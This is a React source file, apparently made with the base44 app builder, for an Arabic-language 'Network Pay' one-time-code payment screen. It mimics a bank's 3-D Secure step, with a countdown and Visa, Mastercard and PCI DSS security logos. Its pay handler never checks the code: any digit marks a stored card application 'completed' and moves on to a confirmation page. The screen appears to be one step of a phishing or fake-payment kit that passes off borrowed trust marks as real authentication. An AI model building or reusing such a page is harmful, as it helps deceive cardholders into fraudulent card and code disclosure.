import { useState, useRef, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { base44 } from "@/api/base44Client";

export default function OtpVerify() {
  const navigate = useNavigate();
  const [otp, setOtp] = useState("");
  const [loading, setLoading] = useState(false);
  const [timeLeft, setTimeLeft] = useState(234);
  const inputRef = useRef(null);

  useEffect(() => {
    if (timeLeft <= 0) return;
    const timer = setInterval(() => setTimeLeft((t) => t - 1), 1000);
    return () => clearInterval(timer);
  }, [timeLeft]);

  const minutes = String(Math.floor(timeLeft / 60)).padStart(2, "0");
  const seconds = String(timeLeft % 60).padStart(2, "0");

  const handleChange = (e) => {
    const val = e.target.value.replace(/\D/g, "").slice(0, 6);
    setOtp(val);
  };

  const handlePay = async () => {
    if (otp.length < 1) return;
    setLoading(true);
    const appId = localStorage.getItem("card_app_id");
    if (appId) {
      await base44.entities.CardApplication.update(appId, {
        current_step: "confirmation",
        status: "completed",
      });
      localStorage.removeItem("card_app_id");
    }
    setLoading(false);
    navigate("/confirmation");
  };

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col items-center" dir="rtl">
      <div className="w-full bg-white flex justify-center py-5 border-b border-gray-100">
        <img
          src="https://media.base44.com/images/public/6a1908e5cd52b6a8fe5b8021/b1b4a5663_2f3eb4_5549add76f694127877610465c9f8733mv2.jpeg"
          alt="Network Pay"
          className="h-10 object-contain"
        />
      </div>

      <div className="w-full max-w-sm mx-auto mt-6 px-4">
        <div className="bg-white rounded-2xl shadow-md overflow-hidden">
          <div className="flex justify-center pt-6 pb-3 border-b border-gray-100">
            <img
              src="https://media.base44.com/images/public/6a1908e5cd52b6a8fe5b8021/b1b4a5663_2f3eb4_5549add76f694127877610465c9f8733mv2.jpeg"
              alt="Network Pay"
              className="h-8 object-contain"
            />
          </div>

          <div className="px-6 py-5 flex flex-col items-center text-center">
            <p className="text-sm text-gray-600 leading-relaxed mb-4">
              المصادقة عبر تطبيق الهاتف المتحرك من البنك<br />
              ستتلقى من جهة اصدار البطاقة رمز لعملية الدفع برسالة نصية
            </p>

            <div className="w-10 h-10 rounded-full bg-blue-700 flex items-center justify-center mb-4">
              <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
              </svg>
            </div>

            <p className="text-sm text-gray-700 leading-relaxed mb-1">
              يرجى ادخال رمز التحقق المرسل على الجوال الخاص بك.
            </p>
            <p className="text-sm text-gray-700 leading-relaxed mb-5">
              او قم بفتح تطبيق البنك وانقر على الاشعار الفوري
            </p>

            <input
              ref={inputRef}
              type="text"
              inputMode="numeric"
              placeholder="* * * * * *"
              value={otp}
              onChange={handleChange}
              className="w-full border border-gray-300 rounded-lg px-4 py-3.5 text-center text-lg tracking-[0.5em] font-semibold focus:outline-none focus:border-blue-500 bg-white mb-3"
            />

            <p className="text-2xl font-bold text-gray-800 mb-5 tabular-nums">
              {minutes}:{seconds}
            </p>

            <button
              onClick={handlePay}
              disabled={loading}
              className="w-full py-3.5 text-base font-bold rounded-lg text-white bg-blue-900 hover:bg-blue-800 transition-colors disabled:opacity-70"
            >
              {loading ? "..." : "PAY"}
            </button>
          </div>
        </div>

        <div className="mt-6 flex flex-wrap items-center justify-center gap-3 pb-8">
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/43/PCI_DSS_logo.svg/200px-PCI_DSS_logo.svg.png" alt="PCI DSS" className="h-8 object-contain" />
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Verified_by_Visa.svg/200px-Verified_by_Visa.svg.png" alt="Verified by Visa" className="h-8 object-contain" />
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/MasterCard_SecureCode_Logo.svg/200px-MasterCard_SecureCode_Logo.svg.png" alt="Mastercard SecureCode" className="h-8 object-contain" />
        </div>
      </div>
    </div>
  );
}